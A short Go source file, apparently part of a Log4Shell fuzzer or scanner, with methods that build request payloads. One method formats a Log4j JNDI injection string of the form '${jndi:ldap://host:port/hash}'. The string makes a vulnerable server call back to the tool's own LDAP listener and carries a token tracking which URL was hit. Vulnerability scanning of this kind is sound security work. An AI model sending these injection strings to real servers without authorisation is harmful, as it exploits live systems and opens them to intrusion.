package l9l4gfuzz

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"net"
	"time"
)

func (f *fuzzer) Payload(url string, source string) string {
	if f.payloadTemplate == nil {
		log.Fatalln(errors.New("using payload() in request template but no payload template set"))
	}
	var buffer bytes.Buffer
	err := f.payloadTemplate.Execute(&buffer, struct {
		Hash   string
		Fuzzer *fuzzer
	}{
		Hash: f.tokenTranslator.GetHashFromToken(Token{
			SourceUrl:     url,
			PayloadSource: source,
			IssueDate:     time.Now(),
		}),
		Fuzzer: f,
	})
	if err != nil {
		log.Fatalln(err)
	}
	return buffer.String()
}

func (f *fuzzer) PayloadJNDILog4J(url string, source string) string {
	token := Token{
		SourceUrl:     url,
		PayloadSource: source,
		IssueDate:     time.Now(),
	}
	return fmt.Sprintf("${jndi:ldap://%s/%s}",
		net.JoinHostPort(f.ListenIp, f.LDAPPort),
		f.tokenTranslator.GetHashFromToken(token))
}
